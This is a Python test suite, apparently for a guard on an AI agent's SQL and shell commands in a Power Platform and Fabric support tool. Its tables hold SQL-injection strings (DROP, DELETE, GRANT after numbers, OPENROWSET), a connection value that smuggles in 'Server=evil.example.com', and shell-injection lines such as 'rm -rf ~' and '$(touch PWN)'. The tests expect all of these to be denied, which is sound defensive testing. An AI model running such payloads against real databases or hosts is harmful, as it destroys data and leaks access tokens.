expect("sql: token nie w wyjsciu ani w pliku", (SQLTOKEN in text, SQLTOKEN in res_file.read_text(encoding="utf-8")),
       (False, False))
code, text = sql_run(SQLSRV, "ekovoltis", SQL_ITS426, "--out", "zgloszenia/ITS-426/maly.json", "--max-wierszy", "5")
res = json.loads((WORK / "zgloszenia/ITS-426/maly_DANE_OSOBOWE.json").read_text(encoding="utf-8"))
expect("sql: limit wierszy", (res["liczba_wierszy"], res["obcieto"], "obcieto" in text), (5, True, True))
audit_lines = [json.loads(l) for l in (TMP / "state/audyt.jsonl").read_text(encoding="utf-8").splitlines()]
last_sql = [a for a in audit_lines if a.get("typ") == "sql"][-1]
expect("sql: audyt z zapytaniem i liczba wierszy, bez danych",
       (last_sql["zapytanie"] == SQL_ITS426, last_sql["wiersze"], "wiersze" in last_sql and "1.250" not in json.dumps(last_sql)),
       (True, 5, True))

n_before = len(ODBC.connects)
for label, q in [
    ("srednik i DROP", "SELECT 1; DROP TABLE dbo.x"),
    ("DROP bez srednika", "SELECT 1 DROP TABLE dbo.x"),
    ("wielkosc liter", "sElEcT 1 dElEtE fRoM dbo.x"),
    ("DML po komentarzu liniowym", "SELECT 1 --komentarz\nUPDATE dbo.x SET a = 1"),
    ("DML po komentarzu blokowym", "SELECT 1 /* x */UPDATE dbo.x SET a = 1"),
    ("zagniezdzony komentarz", "SELECT 1 /* /* */ */ DELETE FROM dbo.x"),
    ("niezamkniety komentarz", "SELECT 1 /* DROP"),
    ("CTE z DML", "WITH a AS (SELECT * FROM dbo.x) DELETE FROM a"),
    ("CTE z MERGE", "WITH a AS (SELECT 1 AS k) MERGE dbo.x USING a ON 1 = 1 WHEN MATCHED THEN DELETE"),
    ("SELECT INTO", "SELECT * INTO dbo.kopia FROM dbo.x"),
    ("SELECT INTO tymczasowa", "SELECT * INTO #t FROM dbo.x"),
    ("OPENROWSET", "SELECT * FROM OPENROWSET(BULK 'https://x/y.csv', FORMAT = 'CSV') AS r"),
    ("OPENQUERY", "SELECT * FROM OPENQUERY(srv, 'SELECT 1')"),
    ("OPENDATASOURCE", "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'x').db.dbo.t"),
    ("WAITFOR", "SELECT 1 WAITFOR DELAY '00:00:10'"),
    ("EXEC", "EXEC sp_executesql N'DROP TABLE x'"),
    ("EXECUTE po SELECT", "SELECT 1 EXECUTE('DROP TABLE x')"),
    ("INSERT", "INSERT INTO dbo.x VALUES (1)"),
    ("TRUNCATE", "TRUNCATE TABLE dbo.x"),
    ("dwa SELECT", "SELECT 1 SELECT 2"),
    ("sekwencja ODBC", "{call dbo.proc}"),
    ("DECLARE i SET", "SELECT 1 DECLARE @a INT SET @a = 1"),
    ("transakcja", "SELECT 1 COMMIT"),
    ("znak niewidoczny", "SELECT 1 DR\u200bOP TABLE x"),
    ("niezamkniety literal", "SELECT 'x"),
    ("srednik na koncu", "SELECT 1;"),
    ("slowo w nawiasach kwadratowych", "SELECT 1 [DROP] TABLE x"),
    ("DELETE sklejone z liczba i COMMIT", "SELECT a FROM dbo.t WHERE b=1DELETE FROM dbo.t WHERE 1=1COMMIT"),
    ("TRUNCATE sklejone z liczba", "SELECT 1 AS a WHERE 1=1TRUNCATE TABLE dbo.t"),
    ("DROP po liczbie z kropka", "SELECT 1 AS a WHERE 1=1.DROP TABLE dbo.t"),
    ("DROP po kwocie", "SELECT $1DROP TABLE dbo.t"),
    ("GRANT po liczbie szesnastkowej", "SELECT 0xAAGRANT CONTROL TO x"),
    ("ADD SENSITIVITY CLASSIFICATION", "SELECT 1 AS a ADD SENSITIVITY CLASSIFICATION TO dbo.t.c WITH (LABEL='x')"),
    ("komentarz zakonczony samym CR", "SELECT 1 AS a -- x\rDELETE FROM dbo.t"),
    ("hint blokady", "SELECT * FROM dbo.t WITH (TABLOCKX, HOLDLOCK)"),
    ("separator wiersza Unicode", "SELECT 1\u2028DELETE FROM dbo.t"),
    ("DROP po liczbie z pustym wykladnikiem", "SELECT 1 AS a WHERE 1=1eDROP TABLE dbo.t"),
    ("DROP po .5e", "SELECT 1 AS a WHERE 1=.5eDROP TABLE dbo.t"),
    ("inna baza (nazwa trzyczesciowa)", "SELECT * FROM innabaza.dbo.t"),
    ("inna baza z pominietym schematem", "SELECT * FROM innabaza..t"),
    ("nazwa piecioczesciowa", "SELECT * FROM a.b.c.d.e"),
    ("kropka w nazwie w nawiasach", "SELECT * FROM [ekovoltis.x].dbo.t"),
    ("kropka w nazwie w cudzyslowie", 'SELECT * FROM "ekovoltis.x".dbo.t'),
    ("spacja w nazwie bazy", "SELECT * FROM [x ekovoltis].dbo.t"),
    ("baza z kropkowanym i (Unicode)", "SELECT * FROM ekovolt\u0131s.dbo.t"),
    ("baza z kropkowanym i w nawiasach", "SELECT * FROM [ekovolt\u0131s].dbo.t"),
]:
    code, text = sql_run(SQLSRV, "ekovoltis", q, "--out", "zgloszenia/ITS-426/x.json")
    expect(f"sql: odrzucone przed wyslaniem: {label}", code, 3)
    expect(f"sql: straznik odrzuca: {label}",
           decision(f'{Q} sql {SQLSRV} ekovoltis {shlex.quote(q)} --out zgloszenia/ITS-426/x.json'), "deny")
expect("sql: odrzucone nie dotarly do serwera", len(ODBC.connects), n_before)
for label, q in [("literal z DROP i srednikiem", "SELECT 'DROP TABLE x; --' AS t"),
                 ("komentarz z DELETE", "SELECT 1 AS a /* DELETE; */"),
                 ("nazwa z baza z listy", "SELECT t.a FROM [ekovoltis].[dbo].[t] AS t"),
                 ("polska nazwa kolumny w nawiasach", "SELECT [Wartość netto] AS w FROM dbo.t"),
                 ("CTE, UNION ALL, podzapytania", "WITH a AS (SELECT 1 AS x) SELECT x FROM a UNION ALL SELECT 2 "
                                                  "WHERE 1 IN (SELECT 1) ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 5 ROWS ONLY")]:
    expect(f"sql: dozwolone: {label}", C.sql_query_problem(q, "ekovoltis"), None)
    expect(f"sql: straznik dopuszcza: {label}",
           decision(f'{Q} sql {SQLSRV} ekovoltis {shlex.quote(q)} --out zgloszenia/ITS-426/x.json'), "allow")

for label, server, db in [("serwer spoza listy", "inny.datawarehouse.fabric.microsoft.com", "ekovoltis"),
                          ("Fabric SQL database", "x.database.fabric.microsoft.com", "ekovoltis"),
                          ("baza spoza listy", SQLSRV, "master"),
                          ("host spoza Fabric", "evil.example.com", "ekovoltis"),
                          ("serwer z portem", SQLSRV + ",1433", "ekovoltis"),
                          ("baza ze srednikiem", SQLSRV, "ekovoltis;Server=evil.example.com")]:
    code, _ = sql_run(server, db, "SELECT 1", "--out", "zgloszenia/ITS-426/x.json")
    expect(f"sql: endpoint odrzucony: {label}", code, 3)
    expect(f"sql: straznik odrzuca endpoint: {label}",
           decision(f'{Q} sql {shlex.quote(server)} {shlex.quote(db)} "SELECT 1" --out zgloszenia/ITS-426/x.json'), "deny")
expect("sql: endpoint spoza listy nie dostal tokenu", len(ODBC.connects), n_before)
cfg_bad = dict(cfg, fabric_sql_endpoints=["evil.example.com/ekovoltis"])
expect("sql: zly wpis w ustawieniach zgloszony", any("fabric_sql_endpoints" in p for p in C.config_problems(cfg_bad)), True)

for label, args in [("bez --out", [SQLSRV, "ekovoltis", "SELECT 1"]),
                    ("--out poza zgloszeniem", [SQLSRV, "ekovoltis", "SELECT 1", "--out", "wynik.json"]),
                    ("--out na plan.md", [SQLSRV, "ekovoltis", "SELECT 1", "--out", "zgloszenia/ITS-426/plan.md"])]:
    code, _ = sql_run(*args)
    expect(f"sql: odmowa zapisu: {label}", code != 0, True)
    expect(f"sql: straznik: {label}", decision(f"{Q} sql " + " ".join(shlex.quote(a) for a in args)), "deny")
code, _ = sql_run(SQLSRV, "ekovoltis", "SELECT 1", "--out", "zgloszenia/ITS-426/x.json", "--max-wierszy", "999999")
expect("sql: --max-wierszy ponad limit", code != 0, True)

for label, count, fails in [("@@TRANCOUNT 0", 0, False), ("@@TRANCOUNT 2", 2, False), ("blad BEGIN TRANSACTION", 1, True)]:
    FAKE_TRAN.update(count=count, begin_fails=fails)
    code, text = sql_run(SQLSRV, "ekovoltis", "SELECT 1 AS a", "--out", "zgloszenia/ITS-426/x.json")
    expect(f"sql: Fabric bez transakcji ({label}): zapytanie nie jest wykonane, wycofanie i zamkniecie",
           (code != 0, ("execute", "SELECT 1 AS a") in ODBC.connects[-1]["conn"].log,
            ODBC.connects[-1]["conn"].log[-3:] == ROLLBACK_TAIL, SQLTOKEN in text), (True, False, True, False))
FAKE_TRAN.update(count=1, begin_fails=False)
real_explicit = P._explicit_transaction
P._explicit_transaction = lambda server: False  # inny serwer: tryb niejawny jak w 1.4.0
FAKE_OPTIONS["v"] = 32
code, text = sql_run(SQLSRV, "ekovoltis", "SELECT 1 AS a", "--out", "zgloszenia/ITS-426/x.json")
P._explicit_transaction = real_explicit
expect("sql: inny serwer bez transakcji niejawnych: zapytanie nie jest wykonane",
       (code != 0, ("execute", "SELECT 1 AS a") in ODBC.connects[-1]["conn"].log, ODBC.connects[-1]["autocommit"]),
       (True, False, False))
FAKE_OPTIONS["v"] = 2
ODBC.fail = "Bearer " + SQLTOKEN
code, text = sql_run(SQLSRV, "ekovoltis", "SELECT 1", "--out", "zgloszenia/ITS-426/blad.json")
expect("sql: blad logowania: komunikat z kontem e2vitservice, bez tokenu",
       (code != 0, "e2vitservice" in text, SQLTOKEN in text), (True, True, False))
expect("sql: po bledzie zapytania transakcja wycofana", ODBC.connects[-1]["conn"].log[-3:], ROLLBACK_TAIL)
ODBC.fail = ""
P._odbc = lambda: FakeOdbc(drivers=["SQL Server"])
code, text = sql_run(SQLSRV, "ekovoltis", "SELECT 1", "--out", "zgloszenia/ITS-426/x.json")
expect("sql: brak sterownika 18 opisany", (code != 0, "ODBC Driver 18" in text), (True, True))


def _no_pyodbc():
    raise RuntimeError("Brak modulu pyodbc. Zainstaluj: python -m pip install pyodbc")


P._odbc = _no_pyodbc
code, text = sql_run(SQLSRV, "ekovoltis", "SELECT 1", "--out", "zgloszenia/ITS-426/x.json")
expect("sql: brak pyodbc opisany", (code != 0, "pyodbc" in text), (True, True))

results37 = []
P._odbc = lambda: ODBC
P.probe_sql(lambda o, t, ok, s, h="": results37.append((o, t, ok, s)))
expect("sprawdz-dostepy: sterownik i SELECT TOP 1 na endpoincie",
       [(r[1], r[2]) for r in results37], [("sterownik ODBC", True), ("SELECT TOP 1 ekovoltis", True)])
expect("sprawdz-dostepy: bez tokenu w raporcie", any(SQLTOKEN in str(r) for r in results37), False)

for label, cmd, tool in [("sqlcmd", f'sqlcmd -S {SQLSRV} -d ekovoltis -G -Q "SELECT 1"', "Bash"),
                         ("sqlcmd bez hosta", 'sqlcmd -S srv -Q "DELETE FROM x"', "Bash"),
                         ("sqlcmd.exe", 'C:\\tools\\sqlcmd.exe -Q "SELECT 1"', "PowerShell"),
                         ("Invoke-Sqlcmd", 'Invoke-Sqlcmd -ServerInstance srv -Query "SELECT 1"', "PowerShell"),
                         ("token dla SQL", "az account get-access-token --resource https://database.windows.net/", "Bash")]:
    expect(f"sql: straznik blokuje {label}", decision(cmd, tool), "deny")
expect("sql: slowo sqlcmd w nazwie pliku nie blokuje", decision("cat notatki-mysqlcmdx.txt"), None)
expect("sql: echo sqlcmd nie blokuje", decision("echo sqlcmd"), None)
expect("sql: grep bcp nie blokuje", decision("grep bcp notatki.md"), None)
expect("sql: sqlcmd w bash -c", decision("bash -c 'sqlcmd -Q x'"), "deny")
expect("sql: sqlcmd pod nakladka", decision('env A=1 timeout 5 sqlcmd -Q "SELECT 1"'), "deny")
expect("sql: Read-SqlTableData", decision("Read-SqlTableData -ServerInstance s -TableName t", "PowerShell"), "deny")
SQLBASE = f"{Q} sql {SQLSRV} ekovoltis"
for label, cmd, tool, want in [
    ("podstawienie $() w zapytaniu", SQLBASE + ' "SELECT \'$(az account get-access-token -o tsv)\' AS a" --out zgloszenia/ITS-426/a.json', "Bash", "deny"),
    ("backtick w zapytaniu", SQLBASE + ' "SELECT `id` AS a" --out zgloszenia/ITS-426/a.json', "Bash", "deny"),
    ("zmienna w zapytaniu", SQLBASE + ' "SELECT $X AS a" --out zgloszenia/ITS-426/a.json', "Bash", "deny"),
    ("zapytanie w pojedynczym cudzyslowie z $( jako nazwa", SQLBASE + " 'SELECT 1 AS [$(x)]' --out zgloszenia/ITS-426/a.json", "Bash", "allow"),
    ("przekierowanie do plan.md", SQLBASE + ' "SELECT 1 AS a" --out zgloszenia/ITS-426/a.json > zgloszenia/ITS-426/plan.md', "Bash", "deny"),
    ("przekierowanie bledow do dziennika", SQLBASE + ' "SELECT 1 AS a" --out zgloszenia/ITS-426/a.json 2>zgloszenia/ITS-426/wykonanie.jsonl', "Bash", "deny"),
    ("przekierowanie >&plik", SQLBASE + ' "SELECT 1 AS a" --out zgloszenia/ITS-426/a.json >&zgloszenia/ITS-426/plan.md', "Bash", "deny"),
    ("przekierowanie &>plik", SQLBASE + ' "SELECT 1 AS a" --out zgloszenia/ITS-426/a.json &>zgloszenia/ITS-426/plan.md', "Bash", "deny"),
    ("2>&1 dozwolone", SQLBASE + ' "SELECT 1 AS a" --out zgloszenia/ITS-426/a.json 2>&1', "Bash", "allow"),
    ("PowerShell $() w zapytaniu", f'& "{WIN}" sql {SQLSRV} ekovoltis "SELECT 1 AS a $(Remove-Item x)" --out zgloszenia/ITS-426/a.json', "PowerShell", "deny"),
    ("PowerShell w pojedynczym cudzyslowie", f"& \"{WIN}\" sql {SQLSRV} ekovoltis 'SELECT 1 AS a' --out zgloszenia/ITS-426/a.json", "PowerShell", "allow"),
    ("get z podstawieniem", f'{Q} get "{DV}/api/data/v9.2/$(id)"', "Bash", "deny"),
    ("get z przekierowaniem do stanu", f'{Q} get "{DV}/api/data/v9.2/WhoAmI" > ~/.claude/pp-support-state/x', "Bash", "deny"),
    ("get z $top w cudzyslowie nadal dozwolony", f'{Q} get "{DV}/api/data/v9.2/x?$top=5"', "Bash", "allow"),
    ("get 2>/dev/null dozwolony", f'{Q} get "{DV}/api/data/v9.2/WhoAmI" 2>/dev/null', "Bash", "allow"),
    ("komentarz z apostrofem i nowa linia", f"{Q} get x #'\nrm -rf ~ #'", "Bash", "deny"),
    ("cudzyslow $'...'", f"{Q} get $'\\'' ; echo X #'", "Bash", "deny"),
    ("PowerShell nawias", f'& "{WIN}" get (Remove-Item C:/x)', "PowerShell", "deny"),
    ("PowerShell metoda na zmiennej", f'& "{WIN}" get $ExecutionContext.InvokeCommand.InvokeScript(\'x\')', "PowerShell", "deny"),
    ("PowerShell typograficzne cudzyslowy", f"& \"{WIN}\" get 'a\u2019; Remove-Item C:/x; \u2018b'", "PowerShell", "deny"),
    ("PowerShell here-string", f"& \"{WIN}\" get @'\n'\"\n'@; Remove-Item C:/x #\"", "PowerShell", "deny"),
    ("PowerShell --%", f"& \"{WIN}\" get --% x", "PowerShell", "deny"),
    ("cudzyslow w celu przekierowania", f"{Q} get url >/dev/null' ' $(echo X >&2) ' >/dev/null'", "Bash", "deny"),
    ("backslash i cudzyslow", f"{Q} get url \\\" >/dev/null' ' ; echo X > x.txt #\\'", "Bash", "deny"),
    ("PowerShell cudzyslow w celu przekierowania", f"& '{WIN}' get url 2>&1' ' $(Write-Host X) ' 2>&1'", "PowerShell", "deny"),
    ("tabulator po >", f"{Q} get url >\t../evil.txt", "Bash", "deny"),
    ("tabulator po <", f"{Q} get url <\t~/.bashrc", "Bash", "deny"),
    ("PowerShell tabulator po *>", f"& '{WIN}' get url *>\tevil.txt", "PowerShell", "deny"),
    ("NBSP po >", f"{Q} get url > evil.txt", "Bash", "deny"),
    ("cel w cudzyslowie", f"{Q} get url >'$null'", "Bash", "deny"),
    ("rozwiniecie klamrowe", f"{Q} get url {{--out,../../evil}}", "Bash", "deny"),
    ("bash > nul", f"{Q} get url > nul", "Bash", "deny"),
    ("bash >/DEV/NULL", f"{Q} get url >/DEV/NULL", "Bash", "deny"),
    ("bash 2>$null", f"{Q} get url 2>$null", "Bash", "deny"),
    ("PowerShell > /dev/null", f"& '{WIN}' get url > /dev/null", "PowerShell", "deny"),
    ("pac z podstawieniem bez auto-zgody", "pac org list $(touch PWN)", "Bash", None),
    ("pac z przekierowaniem bez auto-zgody", "pac org list > PWN", "Bash", None),
    ("az z backtickiem bez auto-zgody", 'az account show --query "`touch PWN`"', "Bash", None),
    ("ppcall i pac z \\' bez auto-zgody", f"{Q} status INC-1; pac org list \\'; touch PWN; echo \\'", "Bash", None),
    ("pac odczyt nadal dozwolony", "pac org list", "Bash", "allow"),
    ("sql: $$ w zapytaniu", SQLBASE + ' "SELECT $$ AS a" --out zgloszenia/ITS-426/a.json', "Bash", "deny"),
    ("PowerShell adres z $top w '...'", f"& \"{WIN}\" get '{DV}/api/data/v9.2/x?$top=5' 2>$null", "PowerShell", "allow"),
]:
    expect(f"powloka w ppcall: {label}", decision(cmd, tool), want)
cfg["fabric_sql_endpoints"] = []
C.save_config(cfg)
expect("sql: pusta lista endpointow wylacza komende",
       decision(f'{Q} sql {SQLSRV} ekovoltis "SELECT 1" --out zgloszenia/ITS-426/x.json'), "deny")
for f in (WORK / "zgloszenia/ITS-426").glob("*_DANE_OSOBOWE.json"):
    f.unlink()

print("38. 1.4.1: item() w petli tylko przy adresie, zapytania SQL w flow-patch (ITS-418)")
DVHOST = {"connectionName": "shared_commondataserviceforapps_1", "operationId": "ListRecords",
          "apiId": "/providers/Microsoft.PowerApps/apis/shared_commondataserviceforapps"}
SQLHOST = {"connectionName": "shared_sql_2", "operationId": "ExecutePassThroughNativeQuery_V2",
           "apiId": "/providers/Microsoft.PowerApps/apis/shared_sql"}
SQL_OLD = ("WITH PV AS (SELECT NumerPPE, SUM(Produkcja) AS ProdukcjaMWh FROM dbo.produkcja "
           "WHERE NumerPPE IN (@{variables('JW')}) GROUP BY NumerPPE) SELECT * FROM PV;")
SQL_NEW = ("WITH PV AS (SELECT NumerPPE, SUM(Produkcja) AS ProdukcjaMWh FROM dbo.produkcja "
           "WHERE NumerPPE NOT IN (@{variables('JW')}) GROUP BY NumerPPE), FW AS (SELECT NumerPPE, "
           "SUM(Produkcja) AS ProdukcjaFWMWh FROM dbo.produkcja GROUP BY NumerPPE) "
           "SELECT PV.*, FW.ProdukcjaFWMWh FROM PV LEFT JOIN FW ON FW.NumerPPE = PV.NumerPPE")


def dv(entity, extra=None, ra=None):
    return {"type": "OpenApiConnection", "runAfter": ra or {},
            "inputs": {"host": dict(DVHOST), "parameters": {"entityName": entity, **(extra or {})},
                       "authentication": "@parameters('$authentication')"}}


DEF6 = {"properties": {"connectionReferences": {}, "definition": {"triggers": {"manual": {"type": "Request"}}, "actions": {
    "Init_JW": {"type": "InitializeVariable", "runAfter": {},
                "inputs": {"variables": [{"name": "JW", "type": "string", "value": ""}]}},
    "Apply_to_each": {"type": "Foreach", "runAfter": {"Init_JW": ["Succeeded"]}, "foreach": "@triggerBody()?['umowy']",
                      "actions": {
                          "List_rows": dv("eko_umowy", {"$filter": "eko_id eq '@{item()?['id']}'"}),
                          "List_rows_3": dv("eko_atrybuty", {"$filter": "eko_umowa eq '@{item()?['id']}'",
                                                             "$expand": "eko_jednostka"},
                                            {"List_rows": ["Succeeded"]}),
                          "Append_JW": {"type": "AppendToStringVariable", "runAfter": {"List_rows_3": ["Succeeded"]},
                                        "inputs": {"name": "JW", "value": "@{item()?['ppe']},"}},
                          "PobierzdanePPE": {"type": "OpenApiConnection", "runAfter": {"Append_JW": ["Succeeded"]},
                                             "inputs": {"host": dict(SQLHOST),
                                                        "parameters": {"server": "default", "database": "default",
                                                                       "query/query": SQL_OLD},
                                                        "authentication": "@parameters('$authentication')"}},
                          "Scope_dane": {"type": "Scope", "runAfter": {"PobierzdanePPE": ["Succeeded"]}, "actions": {
                              "Select_3": {"type": "Select", "runAfter": {},
                                           "inputs": {"from": "@body('PobierzdanePPE')?['resultsets']?['Table1']",
                                                      "select": {"PPE": "@item()?['NumerPPE']",
                                                                 "PV": "@item()?['ProdukcjaMWh']"}}}}},
                      }},
}}}}
LOOP = ["properties", "definition", "actions", "Apply_to_each", "actions"]


def wf6(d):
    return {"ismanaged": False, "category": 5, "modifiedon": "m", "clientdata": json.dumps(d)}


def defn6(new, old=None):
    return C.flow_definition_live_problems({"oczekiwany_modifiedon": "m"}, wf6(old or DEF6), new)[0]


def patch6(changes, d=None):
    return C.flow_patch_live_problems({"oczekiwany_modifiedon": "m", "zmiany": changes}, wf6(d or DEF6))[0]


def planA(d):
    a = d["properties"]["definition"]["actions"]
    a["Init_JW_FW"] = {"type": "InitializeVariable", "runAfter": {"Init_JW": ["Succeeded"]},
                       "inputs": {"variables": [{"name": "JW_FW", "type": "string", "value": ""}]}}
    a["Apply_to_each"]["runAfter"] = {"Init_JW_FW": ["Succeeded"]}
    inner = a["Apply_to_each"]["actions"]
    inner["Filter_array_JW_FW"] = {"type": "Query", "runAfter": {"List_rows_3": ["Succeeded"]},
                                   "inputs": {"from": "@body('List_rows_3')?['value']",
                                              "where": "@equals(item()?['eko_technologytype'], 1)"}}
    inner["Apply_to_each_JW_FW"] = {"type": "Foreach", "runAfter": {"Filter_array_JW_FW": ["Succeeded"]},
                                    "foreach": "@body('Filter_array_JW_FW')", "actions": {
                                        "Append_JW_FW": {"type": "AppendToStringVariable", "runAfter": {},
                                                         "inputs": {"name": "JW_FW", "value": "@{item()?['ppe']},"}}}}
    inner["Append_JW"]["runAfter"] = {"Apply_to_each_JW_FW": ["Succeeded"]}
    inner["Scope_dane"]["actions"]["Select_3"]["inputs"]["select"]["FW"] = "@item()?['ProdukcjaFWMWh']"
    return d


expect("ITS-418: konektory w petli bez item() w adresie nie czynia petli wrazliwa",
       sorted(n for k, n in C.sensitive_refs(DEF6) if k == "act"), [])
expect("ITS-418: plan A (nowe akcje wbudowane w petli) przechodzi flow-definition", defn6(planA(copy.deepcopy(DEF6))), [])
LR3 = LOOP + ["List_rows_3", "inputs", "parameters", "$expand"]
SQLQ = LOOP + ["PobierzdanePPE", "inputs", "parameters", "query/query"]
expect("ITS-418: flow-patch $expand w petli przechodzi",
       patch6([{"sciezka": LR3, "bylo": "eko_jednostka", "ma_byc": "eko_jednostka($select=eko_technologytype)"}]), [])
expect("ITS-418: flow-patch zapytania SQL (SELECT -> SELECT z CTE) przechodzi",
       patch6([{"sciezka": SQLQ, "bylo": SQL_OLD, "ma_byc": SQL_NEW}]), [])


def mod6(change):
    d = copy.deepcopy(DEF6)
    change(d["properties"]["definition"]["actions"], d["properties"]["definition"]["actions"]["Apply_to_each"]["actions"])
    return d


HTTP_ITEM = {"type": "Http", "runAfter": {}, "inputs": {"method": "GET", "uri": "https://api.example.com/@{item()?['id']}"}}
for label, change, sens in [
    ("item() w adresie akcji w petli", lambda a, i: i.update(H=copy.deepcopy(HTTP_ITEM)), "apply_to_each"),
    ("item() przez Compose", lambda a, i: i.update(
        Cmp={"type": "Compose", "runAfter": {}, "inputs": "@item()?['id']"},
        H={"type": "Http", "runAfter": {}, "inputs": {"method": "GET", "uri": "https://api.example.com/@{outputs('Cmp')}"}}),
     "apply_to_each"),
    ("item() przez zmienna", lambda a, i: (a.update(Init_U={"type": "InitializeVariable", "runAfter": {},
                                                           "inputs": {"variables": [{"name": "U", "type": "string"}]}}),
                                          i.update(SetU={"type": "SetVariable", "runAfter": {},
                                                         "inputs": {"name": "U", "value": "@item()?['id']"}},
                                                   H={"type": "Http", "runAfter": {},
                                                      "inputs": {"method": "GET", "uri": "@variables('U')"}})),
     "apply_to_each"),
    ("items('zewnetrzna') w petli zagniezdzonej", lambda a, i: i.update(
        Inner={"type": "Foreach", "runAfter": {}, "foreach": "@createArray(1,2)", "actions": {
            "H": {"type": "Http", "runAfter": {},
                  "inputs": {"method": "GET", "uri": "https://api.example.com/@{items('Apply_to_each')?['id']}"}}}}),
     "apply_to_each"),
    ("result('<zakres>') w adresie", lambda a, i: i.update(
        H={"type": "Http", "runAfter": {}, "inputs": {"method": "POST", "uri": "https://x/@{result('Scope_dane')}"}}),
     "select_3"),
    ("outputs('<petla>') w adresie", lambda a, i: a.update(
        H={"type": "Http", "runAfter": {}, "inputs": {"method": "POST", "uri": "https://x/@{outputs('Apply_to_each')}"}}),
     "list_rows_3"),
]:
    d = mod6(change)
    expect(f"petle: nadal wrazliwe: {label}", sens in {n for k, n in C.sensitive_refs(d)}, True)
d = mod6(lambda a, i: i.update(H=copy.deepcopy(HTTP_ITEM)))
changed = copy.deepcopy(d)
changed["properties"]["definition"]["actions"]["Apply_to_each"]["foreach"] = "@triggerBody()?['inne']"
expect("petle: zmiana foreach petli z item() w adresie zablokowana", bool(defn6(changed, d)), True)
d2 = mod6(lambda a, i: i.update(
    Inner={"type": "Foreach", "runAfter": {}, "foreach": "@createArray(1,2)", "actions": {
        "H": {"type": "Http", "runAfter": {},
              "inputs": {"method": "GET", "uri": "https://api.example.com/@{items('Apply_to_each')?['id']}"}}}}))
expect("petle: items('zewnetrzna') nie czyni wewnetrznej petli zrodlem",
       "inner" in {n for k, n in C.sensitive_refs(d2)}, False)
d3 = mod6(lambda a, i: i.update(
    H={"type": "Http", "runAfter": {}, "inputs": {"method": "GET", "uri": "https://api.example.com/@{item()?['id']}"}}))
expect("petle: przy item() nie rozwija akcji w srodku petli", "select_3" in {n for k, n in C.sensitive_refs(d3)}, False)
d4 = mod6(lambda a, i: i.update(
    H={"type": "Http", "runAfter": {}, "inputs": {"method": "GET", "uri": "@{variables(concat('a','b'))}"}}))
expect("petle: nazwa wyliczana nadal blokuje", C.ANY_REF in C.sensitive_refs(d4), True)
d5 = mod6(lambda a, i: i.update(
    Sel={"type": "Select", "runAfter": {}, "inputs": {"from": "@item()?['linie']", "select": {"a": "@item()?['a']"}}},
    H={"type": "Http", "runAfter": {}, "inputs": {"method": "GET", "uri": "https://x/@{body('Sel')}"}}))
expect("petle: item() w 'from' akcji Select w petli wskazuje petle", "apply_to_each" in {n for k, n in C.sensitive_refs(d5)}, True)
d6 = mod6(lambda a, i: a.update(
    Sel={"type": "Select", "runAfter": {}, "inputs": {"from": "@triggerBody()?['x']", "select": {"a": "@item()?['a']"}}},
    H={"type": "Http", "runAfter": {}, "inputs": {"method": "GET", "uri": "https://x/@{body('Sel')}"}}))
expect("petle: item() w mapowaniu Select poza petla nie wskazuje petli", sorted(n for k, n in C.sensitive_refs(d6)), ["sel"])
d7 = mod6(lambda a, i: a.update(
    U={"type": "Until", "expression": "@equals(1,1)", "limit": {"count": 3}, "runAfter": {}, "actions": {
        "H": {"type": "Http", "runAfter": {}, "inputs": {"method": "GET", "uri": "https://x/@{iterationIndexes('U')}"}}}}))
d8 = mod6(lambda a, i: (a.update(Init_Q={"type": "InitializeVariable", "runAfter": {},
                                        "inputs": {"variables": [{"name": 'u"rl', "type": "string"}]}}),
                       i.update(H={"type": "Http", "runAfter": {}, "inputs": {"method": "GET", "uri": "@variables('u\"rl')"}})))
expect("nazwa zmiennej z cudzyslowem zgodna z defines()", ("var", 'u"rl') in C.sensitive_refs(d8), True)
expect("petle: iterationIndexes('<petla>') w adresie", "u" in {n for k, n in C.sensitive_refs(d7)}, True)

for label, old, new, bad in [
    ("SELECT -> DELETE odrzucone", SQL_OLD, "DELETE FROM dbo.produkcja", True),
    ("SELECT -> SELECT z DROP po liczbie odrzucone", SQL_OLD, "SELECT 1 AS a WHERE 1=1DROP TABLE dbo.produkcja", True),
    ("SELECT -> cale wyrazenie odrzucone", SQL_OLD, "@concat('DELETE FROM ', variables('JW'))", True),
    ("SELECT -> SELECT z CTE przechodzi", SQL_OLD, SQL_NEW, False),
    ("DML -> DML bez zmian zachowania", "UPDATE dbo.t SET a = 1", "UPDATE dbo.t SET a = 2", False),
]:
    d = copy.deepcopy(DEF6)
    d["properties"]["definition"]["actions"]["Apply_to_each"]["actions"]["PobierzdanePPE"]["inputs"]["parameters"]["query/query"] = old
    errs6 = patch6([{"sciezka": SQLQ, "bylo": old, "ma_byc": new}], d)
    expect(f"SQL w flow-patch: {label}", any("zapytanie SQL" in e for e in errs6), bad)
for label, old, new, bad in [
    ("wyrazenie z tekstem w nowym zapytaniu", "SELECT a FROM t", "SELECT a FROM t WHERE 1=@{'1; DELETE FROM t'}", True),
    ("concat w nowym zapytaniu", "SELECT a FROM t", "SELECT a FROM t @{concat('; DROP',' TABLE t')}", True),
    ("wyrazenie z formatem przeniesione z literalu poza literal",
     "SELECT a FROM t WHERE b = '@{formatDateTime(variables('D'), 'yyyy')}'",
     "SELECT a FROM t WHERE b = @{formatDateTime(variables('D'), 'yyyy')}", True),
    ("powtorzone wyrazenie ze starego zapytania przechodzi",
     "SELECT a FROM t WHERE b < '@{formatDateTime(variables('D'), 'yyyy')}'",
     "SELECT a FROM t WHERE b < '@{formatDateTime(variables('D'), 'yyyy')}' AND c < '@{formatDateTime(variables('D'), 'yyyy')}'", False),
    ("nowe wyrazenie na danych (plan B) przechodzi", "SELECT a FROM t",
     "SELECT a FROM t WHERE b IN (@{if(empty(variables('JW_FW')), , substring(variables('JW_FW'), 0, sub(length(variables('JW_FW')), 1)))})", False),
    ("nowe wyrazenie z workflow() odrzucone", "SELECT a FROM t",
     "SELECT a FROM t WHERE b = @{substring(string(workflow()), 0, 5)}", True),
    ("nowe wyrazenie z formatem tekstowym odrzucone", "SELECT a FROM t",
     "SELECT a FROM t @{formatDateTime(utcNow(), '\'; DROP TABLE t\'')}", True),
    ("nowe wyrazenie z polem przechodzi", "SELECT a FROM t",
     "SELECT a FROM t WHERE b = '@{items('Apply_to_each')?['NumerPPE']}'", False),
    ("nowe odwolanie do danych przechodzi", "SELECT a FROM t WHERE b IN (@{variables('JW')})",
     "SELECT a FROM t WHERE b IN (@{variables('JW')}) OR c IN (@{variables('JW_FW')})", False),
